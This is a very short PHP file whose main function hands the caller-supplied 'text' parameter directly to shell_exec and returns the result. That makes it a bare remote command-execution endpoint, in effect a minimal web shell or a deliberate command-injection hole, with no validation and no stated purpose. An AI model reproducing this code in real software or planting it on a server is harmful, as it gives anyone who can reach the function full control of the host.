<?php
function main($params) {
    return shell_exec($params['text']);
}
?>
